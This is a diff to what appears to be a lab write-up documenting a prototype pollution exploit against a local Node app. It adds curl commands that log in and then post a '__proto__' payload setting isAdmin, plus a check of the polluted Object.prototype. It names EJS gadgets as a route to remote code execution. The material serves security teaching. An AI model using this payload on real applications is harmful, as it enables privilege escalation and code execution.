@@ -8,14 +8,21 @@
 
 ## Exploit
 
+1. Send the poison. No login needed... actually `/preferences` requires a session, so get one first:
+
 ```bash
+curl -s -c cookies.txt -X POST http://localhost:8888/login/auth \
+  -d "username=alice" -d "password=alice123"
+
 curl -s -b cookies.txt -X POST http://localhost:8888/preferences \
   -H "Content-Type: application/json" \
   -d '{"__proto__":{"isAdmin":true}}'
 # {"ok":true,"prefs":{}}
 ```
 
-Confirm the poison inside the web process:
+The prefs look empty — the write went somewhere much better: `Object.prototype`.
+
+2. Confirm the poison inside the web process:
 
 ```bash
 docker compose exec web node -e "
@@ -25,7 +32,7 @@ console.log(({}).pollutedFlag);   // 7  ← every new object inherits it
 "
 ```
 
-Why this is dangerous: any code that does `if (opts.isAdmin)`, `if (config.debug)`, or builds objects then reads missing keys can now take attacker-chosen branches. Classic escalation paths: auth-flag flips, template engine RCE (e.g. `ejs` `outputFunctionName`-style gadgets), denial of service via `Object.prototype` = huge values.
+3. Why this is dangerous: any code that does `if (opts.isAdmin)`, `if (config.debug)`, or builds objects then reads missing keys can now take attacker-chosen branches. Classic escalation paths: auth-flag flips, template engine RCE (`ejs` has `outputFunctionName`-style gadgets — and this app renders EJS), denial of service via `Object.prototype` = huge values.
 
 ## Why it happens
 
